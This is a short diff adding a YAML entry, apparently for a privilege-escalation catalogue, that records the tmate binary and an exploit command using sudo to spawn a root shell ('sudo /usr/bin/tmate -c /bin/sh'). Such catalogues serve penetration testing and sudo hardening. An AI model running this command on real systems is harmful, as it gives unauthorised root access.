@@ -1,0 +1,4 @@
+name: tmate
+binary_path: /usr/bin/tmate
+exploit_cmds:
+- sudo /usr/bin/tmate -c /bin/sh
